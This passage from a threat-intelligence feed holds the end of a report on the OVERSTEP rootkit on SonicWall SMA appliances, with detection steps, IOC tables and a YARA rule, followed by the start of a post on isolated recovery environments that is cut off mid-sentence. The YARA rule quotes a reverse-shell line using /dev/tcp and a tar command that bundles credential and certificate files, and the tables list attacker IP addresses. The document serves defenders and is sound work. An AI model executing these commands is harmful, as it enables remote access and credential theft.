on a disk image with greater than 2 bytes of contents. This file should not exist with actual contents on a standard SMA appliance, and the rootkit will hide it from a live system.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Malicious modifications to RC scripts, most notably the </span><code style=\"vertical-align: baseline;\">/etc/rc.d/rc.fwboot</code><span style=\"vertical-align: baseline;\"> script.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Files with irregular timestamps within the <code>INITRD</code> image (</span><code style=\"vertical-align: baseline;\">/cf/firmware/</code><span style=\"vertical-align: baseline;\">).</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<h4><span style=\"vertical-align: baseline;\">Log and Network Analysis</span></h4>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Web requests to the appliance containing </span><code style=\"vertical-align: baseline;\">dobackshell</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">dopasswords</code><span style=\"vertical-align: baseline;\"> in the URL query.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Appliance event logs showing VPN sessions from external IP addresses (especially from low-reputation networks like BLNWX) using administrator accounts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Outbound HTTP network traffic from the appliance to external IP addresses.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Log entries for </span><code style=\"vertical-align: baseline;\">Current settings exported</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">Current settings imported</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">Clear all logs manually</code><span style=\"vertical-align: baseline;\"> occurring outside of scheduled maintenance windows.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Irregular activity or threats within other log files from the appliances, including from inside the </span><code style=\"vertical-align: baseline;\">FLASH.DAT</code><span style=\"vertical-align: baseline;\"> files (</span><code style=\"vertical-align: baseline;\">current</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">backup</code><span style=\"vertical-align: baseline;\">).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Evidence of lateral movement, primarily over Secure Shell (SSH), from the SMA appliance to other systems in the environment.</span></p>\n</li>\n</ul>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Containment and Eradication</span></h3>\n<p><span style=\"vertical-align: baseline;\">If evidence of compromise is detected, organizations should take immediate steps to contain the threat.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Isolate the affected appliance from the network to prevent further malicious activity.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Preserve disk images and telemetry for a full forensic investigation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Because the full extent of an actor's activity can be difficult to determine, GTIG recommends engaging </span><a href=\"https://cloud.google.com/security/consulting/mandiant-incident-response-services\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant Incident Response</span></a><span style=\"vertical-align: baseline;\"> for a thorough investigation to ensure complete scoping and eradication.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Hardening and Mitigation</span></h3>\n<p><span style=\"vertical-align: baseline;\">To mitigate the immediate threat and harden appliances against future attacks, organizations should:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0018\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Reset all credentials, including passwords and OTP bindings</span></a><span style=\"vertical-align: baseline;\"> for all local and directory users on the appliance. This is the most critical step to invalidate secrets stolen in previous compromises.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Revoke and reissue any certificates with private keys stored on the appliance.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h2>\n<h3><span style=\"vertical-align: baseline;\">Host-Based IOCs</span></h3></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Path(s)</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA256 Hash</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/cf/xxx.elf</span><span style=\"vertical-align: baseline;\">/cf/libsamba-errors.so.6</span><span style=\"vertical-align: baseline;\">/usr/lib/libsamba-errors.so.6</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">b28d57269fe4cd90d1650bde5e905611<br />6de26d211966262e59359d0e2a67d473</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">OVERSTEP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/etc/rc.d/rc.fwboot</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">f0e0db06ca665907770e2202957d3ecc<br />d5a070acac1debaf0889d0d48c10e149</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Modified legitimate boot RC file</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>Network-Based IOCs</h3></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">193.149.180.50</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Source of VPN sessions where compromise occurred (used by UNC6148 between at least May 2025 and June 2025)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">64.52.80.80</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reverse shell IP (used by UNC6148 between at least February 2025 and June 2025)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">193.149.176.230</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Identified by SonicWall as triggering the OVERSTEP backdoor in July 2025</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2>Detections</h2>\n<h3>YARA Rule</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Backdoor_OVERSTEP_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group\"\n\t\tdate_created = \"2025-06-03\"\n\t\tdate_modified = \"2025-06-03\"\n\t\trev = 1\n\tstrings:\n\t\t$s1 = \"dobackshell\"\n\t\t$s2 = \"dopasswords\"\n\t\t$s3 = \"bash -i &gt;&amp; /dev/tcp/%s 0&gt;&amp;1 &amp;\"\n\t\t$s4 = \"tar czfP /usr/src/EasyAccess/www/htdocs/%s.tgz \n/tmp/temp.db /etc/EasyAccess/var/conf/persist.db \n/etc/EasyAccess/var/cert; chmod 777\"\n\t\t$s5 = \"/etc/ld.so.preload\"\n\t\t$s6 = \"libsamba-errors.so.6\"\n\tcondition:\n\t\tuint32(0) == 0x464c457f and filesize &lt; 2MB and 4 of them\n}</code></pre></div>"}
{"source": "Threat Intelligence", "title": "Isolated Recovery Environments: A Critical Layer in Modern Cyber Resilience", "link": "https://cloud.google.com/blog/topics/threat-intelligence/isolated-recovery-environments-modern-cyber-resilience/", "published": "Mon, 07 Jul 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Jaysn Rye</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Executive Summary</span></h2>\n<p><span style=\"vertical-align: baseline;\">As adversaries grow faster, stealthier, and more destructive, traditional recovery strategies are increasingly insufficient. Mandiant's </span><a href=\"https://cloud.google.com/security/resources/m-trends\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">M-Trends 2025</span><span style=\"text-decoration: underline; vertical-align: baseline;\"> report</span></a><span style=\"vertical-align: baseline;\"> reinforces this shift, highlighting that ransomware operators now routinely target not just production systems but also backups. This evolution demands that organizations re-evaluate their resilience posture. One approach gaining traction is the implementation of an isolated recovery environment (IRE)—a secure, logically separated environment built to enable reliable recovery even when an organization's primary network has been compromised.</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog post outlines why IREs matter, how they differ from conventional disaster recovery strategies, and what practical steps enterprises can take to implement them effectively.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Backup Blind Spot</span></h2>\n<p><span style=\"vertical-align: baseline;\">Most organizations assume that regular backups equal resilience; however, that assumption doesn't hold up against today's threat landscape. Ransomware actors and state-sponsored adversaries are increasingly targeting backup infrastructure directly, encrypting, deleting, or corrupting it to prevent recovery and increase leverage.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><span style=\"font-style: italic; vertical-align: baseline;\">M-Trends 2025</span><span style=\"vertical-align: baseline;\"> report reveals that in nearly half of ransomware intrusions, adversaries used legitimate remote management tools to disable security controls and gain persistence. In these scenarios, the compromise often extends to backup systems, especially those accessible from the main domain.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Initial infection vector\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/isolated-recovery-environments-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Observed tools in 2024 ransomware-related investigations (source: <a href=\"https://cloud.google.com/security/resources/m-trends\">M-Trends 2025</a>)</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In short: your backup isn't safe if it's reachable from your production network. During an active incident, that makes it irrelevant.</span></p>\n<h2><span style=\"vertical-align: baseline;\">What Is an Isolated Recovery Environment?</span></h2>\n<p><span style=\"vertical-align: baseline;\">An isolated recovery environment (IRE) is a secure enclave designed to store immutable copies of backups and provide a secure space to validate restored workloads and rebuild in parallel while incident responders carry out the forensic investigation. Unlike traditional disaster recovery solutions, which often rely on replication between live environments, an IRE is logically and physically separated from production.</span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, an IRE is about assuming a breach has occurred and planning for the moment when your primary environment is lost, ensuring you have a clean fallback that hasn't been touched by the adversary.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Key Characteristics of an IRE</span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Separation of infrastructure and access:</strong><span style=\"vertical-align: baseline;\"> The IRE must be isolated from the corporate environment. No shared authentication, no shared tooling, no shared infrastructure or services, no persistent network links or direct TCP/IP connections between the production environment and the IRE.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Restricted administrative workflows:</strong><span style=\"vertical-align: baseline;\"> Day-to-day access is disallowed. Only break-glass, documented processes exist for access during validation or recovery.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Known-good, validated artifacts:</strong><span style=\"vertical-align: baseline;\"> Data entering the IRE must be scanned, verified, and stored with cryptographic integrity checks all while maintaining the isolation controls.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Validation environment and tools:</strong><span style=\"vertical-align: baseline;\"> The IRE must also include a secured network environment, which can be used by security teams to validate restored workloads and remove any identified attacker remnants.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Recovery-ready templates:</strong><span style=\"vertical-align: baseline;\"> Rather than restoring single machines, the IRE should support the rapid rebuild of critical systems in isolation with predefined procedures.</span></li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Implementation Strategy</span></h2>\n<p><span style=\"vertical-align: baseline;\">Successfully implementing an IRE is not a checkbox exercise. It requires coordination between security, infrastructure, identity management, and business continuity teams. The following breaks down the major building blocks and considerations.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Infrastructure Segmentation and Physical Isolation</span></h3>\n<p><span style=\"vertical-align: baseline;\">The foundational principle behind an IRE is separation. The environment must not share any critical infrastructure, identity, network, hypervisors, storage, or other services with the production environment. In most cases, this means:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Dedicated platforms (on-premises or cloud based) and tightly controlled virtualization platforms</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No routable paths from production to the IRE network</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Physical air-gaps or highly restricted one-way replication mechanisms</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Independent DNS, DHCP, and identity services</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Figure 2 illustrates the permitted flows into and within the IRE.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Typical IRE architecture\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/isolated-recovery-environments-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Typical IRE architecture</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Identity and Access Control</span></h3>\n<p><span style=\"vertical-align: baseline;\">Identity is the primary attack vector in many intrusions. An IRE must establish its own identity plane:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No trust relationships to production Active Directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No shared local or domain accounts</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">All administrative access must require phishing resistant multi-factor authentication (MFA)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">All administrative access should be via hardened Privileged Access Workstations (PAW) from within the IRE</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Where possible, implement just-in-time (JIT) access with full audit logging</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Accounts used to manage the IRE should not have any ties to the production environment; this includes being used from a device belonging to the production domain. These accounts must be used from a dedicated PAW.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Secure Administration Flows</span></h3>\n<p><span style=\"vertical-align: baseline;\">Administrative access is often the weak link that attackers exploit. That's why an IRE must be designed with tight control over how it's managed, especially during a crisis.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the following model, all administrative access is performed from a dedicated PAW. This workstation sits inside an isolated management zone and is the only system permitted to access the IRE's core components.</span></p>\n<p><span style=\"vertical-align: baseline;\">Here's how it works:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No production systems, including IT admin workstations, are allowed to directly reach the IRE. These paths are completely blocked.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The PAW manages the IRE's:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Isolated Data Vault</strong><span style=\"vertical-align: baseline;\">, where validated backups are stored.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Management Plane</strong><span style=\"vertical-align: baseline;\">, which includes IRE services such as Active Directory, DNS, PAM, backup, and recovery systems.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Green VLAN</strong><span style=\"vertical-align: baseline;\">, which hosts rebuilt Tier-0 and Tier-1 infrastructure.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Any restored services go first into a yellow staging VLAN, a controlled quarantine zone with no east-west traffic. Systems must be verified clean before moving into the production-ready green VLAN. Remote access to machines in the yellow VLAN is restricted to console only access (hypervisor or iLO consoles) from the PAW. No direct RDP/SSH is permitted.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This design ensures that even during a compromise of the production environment, attackers can't pivot into the recovery environment. All privileged actions are audited, isolated, and console-restricted, giving defenders a clean space to rebuild from.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Permitted administration paths\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/isolated-recovery-environments-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Permitted administration paths</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">One-Way Replication and Immutable Storage</span></h3>\n<p><span style=\"vertical-align: baseline;\">How data enters the IRE is just as important as how it's managed. Backups that are copied into the data transfer zone must be treated as potentially hostile until proven otherwise.</span></p>\n<p><span style=\"vertical-align: baseline;\">To mitigate risk:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Data must flow in only one direction, from production to IRE, never the other way around.*</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">This is typically achieved using data diodes or time-gated software replication that enforces unidirectional movement and session expiry.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ingested data lands in a staging zone where it undergoes:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Hash verification against expected values.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Malware scanning, using both signature and behavioural analysis.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cross-checks against known-good backup baselines (e.g., file structure, size, time delta).</span></p>\n</li>\n</ul>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Once validated, data is committed to immutable storage, often in the form of Write Once, Read Many (WORM) volumes or cloud object storage with compliance-mode object locking. Keys for encryption and retention are not shared with production and must be managed via an isolated KMS or HSM.</span></p>\n<p><span style=\"vertical-align: baseline;\">The goal is to ensure that even if an attacker compromises your primary backup system, they cannot alter or delete what's been stored in the IRE.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">*Depending on overall recovery strategies, it's possible that restored workloads may need to move from the IRE back to a rebuilt production environment. </span></p>\n<h2><span style=\"vertical-align: baseline;\">Recovery Workflows and Drills</span></h2>\n<p><span style=\"vertical-align: baseline;\">An IRE is only useful if it enables recovery under pressure. That means planning and testing full restoration of core services. Effective IRE implementations include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Templates for rebuilding domain controllers, authentication services, and core applications</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Automated provisioning of VMs or containers within the IRE</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Access to disaster recovery runbooks that can be followed by incident responders</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Scheduled tabletop and full-scale recovery exercises (e.g., quarterly or bi-annually)</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Many organizations discover during their first exercise that their documentation is out of date or their backups are incomplete. Recovery drills allow these issues to surface before a real incident forces them into view.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Hash Chaining and Log Integrity</span></h2>\n<p><span style=\"vertical-align: baseline;\">If you're relying on the IRE for forensic investigation as well as recovery, it's essential to ensure the integrity of system logs and metadata. This is where hash chaining becomes important.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Implement hash chaining on logs stored in the IRE to detect tampering.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Apply digital signatures from trusted, offline keys.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Regularly verify the chain against trusted checkpoints.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This ensures that during an incident, you can prove not only what happened but also that your evidence hasn't been modified, either by an attacker or by accident.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Choosing the Right IRE Deployment Model</span></h2>\n<p><span style=\"vertical-align: baseline;\">The right model depends on your environment, compliance obligations, and team maturity.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Model</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Advantages</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Challenges</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">On-Premises</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Full control, better for air-gapped environments</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Higher CapEx, longer provisioning time, less flexibility</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Cloud</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Faster provisioning, built-in automation, easier to test</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Requires strong cloud security maturity and IAM separation</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Hybrid</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Local speed + cloud resilience; ideal for large orgs with critical workloads</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">More complex design; requires secure identity split and replication paths</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Common Pitfalls</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Over-engineering for normal operations</strong><span style=\"vertical-align: baseline;\">: The IRE is not a sandbox. Avoid mission creep.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Using the IRE beyond cyber recovery:</strong><span style=\"vertical-align: baseline;\"> The IRE is not for DR testing, HA, or daily operations. Any non-incident use risks breaking its isolation and trust model.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Assuming cloud equals isolation</strong><span style=\"vertical-align: baseline;\">: Isolation requires deliberate configuration. Cloud tenancy is not enough.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Neglecting insider threats</strong><span style=\"vertical-align: baseline;\">: The IRE must defend against sabotage from inside the organization, not just ransomware.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Closing Thoughts</span></h2>\n<p><span style=\"vertical-align: baseline;\">As attackers accelerate and the blast radius of intrusions expands, the need for trusted, tamper-proof recovery options becomes clear. An 